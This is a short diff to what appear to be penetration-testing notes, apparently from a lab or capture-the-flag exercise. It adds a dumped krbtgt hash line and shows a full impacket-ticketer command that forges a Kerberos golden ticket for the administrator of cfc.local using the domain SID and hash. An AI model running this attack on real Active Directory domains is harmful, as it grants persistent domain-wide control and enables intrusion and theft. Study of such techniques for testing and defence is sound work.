@@ -280,7 +280,8 @@ a. Network Exploitation
 				Things you need: SID, Domain, user, kerberos nthash
 				SID-domain-sid: S-1-5-21-3740544615-3584452696-2332589292
 				domain + user-domain: cfc.local administrator
-				kerberos nthash-nthash: 1ce3bebb61f5bf55cabce5d45a847f5f
+				krbtgt user: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1ce3bebb61f5bf55cabce5d45a847f5f
+				kerberos nthash-nthash: 1ce3bebb61f5bf55cabce5d45a847f5f  WHERE HASH IS THE LAST PART
 				command:
 				impacket-ticketer -nthash 1ce3bebb61f5bf55cabce5d45a847f5f -domain cfc.local administrator -domain-sid S-1-5-21-3740544615-3584452696-2332589292
 				
